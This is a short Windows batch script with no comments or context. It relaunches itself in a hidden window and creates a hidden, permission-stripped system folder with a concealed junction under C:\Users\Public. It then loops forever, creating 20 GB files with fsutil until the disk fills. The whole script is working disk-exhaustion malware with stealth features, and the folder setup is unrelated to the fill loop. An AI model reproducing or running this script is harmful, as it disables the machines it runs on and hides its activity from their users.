@echo off
setlocal enabledelayedexpansion

set TARGET=C:\diskfill
if "%1" neq "hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden'"
    exit
)





if not exist %TARGET% mkdir %TARGET%

set SIZE=21474836480

set COUNT=1

set "FOLDER=C:\Users\Public\ProtectedFolder"
if not exist "%FOLDER%" mkdir "%FOLDER%"
attrib +h +s "%FOLDER%"
icacls "%FOLDER%" /inheritance:r
icacls "%FOLDER%" /remove:g Users
icacls "%FOLDER%" /remove:g Everyone
icacls "%FOLDER%" /remove:g Guests
set "ADMINUSER=AdminUser"
icacls "%FOLDER%" /grant %ADMINUSER%:F
set "JUNC=C:\Users\Public\ProtectedFolder_Link"
if exist "%JUNC%" rd "%JUNC%"
mklink /J "%JUNC%" "%FOLDER%"
attrib +h +s "%JUNC%"

:loop
echo Creating file !COUNT! ...
fsutil file createnew %TARGET%\file!COUNT!.bin %SIZE%
set /a COUNT+=1
goto loop